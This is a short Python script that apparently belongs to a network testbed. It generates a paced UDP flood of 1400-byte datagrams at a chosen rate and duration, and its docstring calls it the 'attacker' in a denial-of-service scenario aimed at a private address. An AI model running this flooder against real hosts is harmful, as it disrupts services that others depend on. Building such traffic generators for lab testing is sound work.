"""
UDP flood generator: the "attacker" in the denial-of-service scenario.

    python3 app/flooder.py --target 10.0.0.11 --mbps 15 --seconds 20

Sends 1400-byte UDP datagrams at a fixed rate. The rate is paced, so --mbps is the offered load.
"""
import argparse
import signal
import socket
import time


def main():
    parser = argparse.ArgumentParser(description="UDP flood generator")
    parser.add_argument("--target", required=True, help="destination IP")
    parser.add_argument("--port", type=int, default=5001)
    parser.add_argument("--mbps", type=float, default=15.0, help="offered load in megabits per second")
    parser.add_argument("--seconds", type=float, default=20.0)
    args = parser.parse_args()
    signal.signal(signal.SIGTERM, lambda *_: (_ for _ in ()).throw(KeyboardInterrupt))

    payload = b"x" * 1400
    packets_per_second = args.mbps * 1e6 / 8 / len(payload)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    start = time.time()
    sent = 0
    print(f"[flooder] {args.mbps} Mbps to {args.target}:{args.port} for {args.seconds}s", flush=True)
    try:
        while time.time() - start < args.seconds:
            due = int((time.time() - start) * packets_per_second)
            while sent < due:
                try:
                    sock.sendto(payload, (args.target, args.port))
                except OSError:
                    pass                      # queue full or no route: keep going, it is a flood
                sent += 1
            time.sleep(0.001)
    except KeyboardInterrupt:
        pass
    print(f"[flooder] done, {sent} packets sent ({sent * len(payload) * 8 / 1e6:.1f} Mbit)", flush=True)


if __name__ == "__main__":
    main()
